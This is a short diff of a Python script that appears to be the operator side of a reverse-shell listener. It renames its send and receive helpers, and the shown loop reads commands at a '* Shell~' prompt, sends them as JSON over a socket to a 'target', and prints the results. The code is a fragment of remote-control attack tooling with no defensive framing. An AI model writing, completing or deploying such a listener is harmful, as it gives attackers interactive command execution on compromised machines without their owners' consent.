@@ -1,11 +1,11 @@
 import json
 import socket
 
-def reliable_send(data):
+def send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
 
-def reliable_recieve():
+def recieve():
     data = ''
     while True:
         try:
@@ -17,10 +17,10 @@ def reliable_recieve():
 def target_communication():
     while True:
         command = input('* Shell~%s: ' % str(ip))
-        reliable_send(command)
+        send(command)
         if command == "quit":
             break
-        result = reliable_recieve()
+        result = recieve()
         print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
